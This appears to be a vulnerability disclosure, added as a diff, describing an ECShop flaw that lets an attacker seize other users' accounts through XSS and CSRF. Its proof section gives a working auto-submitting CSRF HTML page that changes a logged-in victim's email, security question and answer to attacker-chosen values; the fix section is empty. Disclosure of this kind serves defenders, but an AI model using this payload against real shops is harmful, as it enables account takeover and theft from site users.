@@ -1,0 +1,19 @@
+ecshop修改任意用户密码漏洞
+
+[ecshop修改任意用户密码漏洞 全文]
+简要描述：
+ecshop在设计认证机制的时候存在一个问题，导致恶意用户可以窃取其他用户的密码，这个过程可以通过xss和csrf实现
+
+Demo For:http://www.wooyun.org/bug.php?action=view&id=395
+
+详细说明：
+利用csrf和xss可以突破官方所说的“障碍”
+xss版本已经有人说明
+这里给出csrf版本
+
+漏洞证明：
+<html>============<body><form action="http://www.wooyun.org/ecshop/user.php" method="POST"><INPUT TYPE="text" NAME="email" value="hack@wooyun.org"><INPUT TYPE="text" NAME="act" value="act_edit_profile"><INPUT TYPE="text" NAME="sel_question" value="ecshop"><INPUT TYPE="text" NAME="passwd_answer" value="exploit"></body><script>document.forms[0].submit();</script>=========================</html>
+
+
+构造该网页，用户在登录情况下访问该网页将导致email以及一些其他安全信息丢失
+修复方案：
